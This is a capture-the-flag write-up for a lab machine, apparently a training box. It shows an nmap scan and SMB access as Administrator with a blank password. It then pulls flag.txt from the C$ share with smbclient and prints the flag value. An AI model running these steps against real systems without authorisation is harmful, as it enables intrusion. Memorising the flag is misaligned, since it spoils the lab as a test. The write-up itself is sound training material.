
## CTF Writeup: Tactics

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.46.75
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 11:59 -0500
Nmap scan report for 10.129.46.75
Host is up (0.025s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
| smb2-time: 
|   date: 2026-08-13T17:01:28
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 168.63 seconds
```

Enumerated SMB Shares as Administrator User without password.

```
smbclient -L \\\\10.129.46.75 -U Administrator
```

Let's connect to C$, since we can enumerate the whole filesystem doing so!

```
smbclient \\\\10.129.46.75/C$ -U Administrator
cd /Users/Administrator/Desktop
get flag.txt
```

Retrieved flag.txt.

```
f751c19eda8f61ce81827e6930a1f40c
```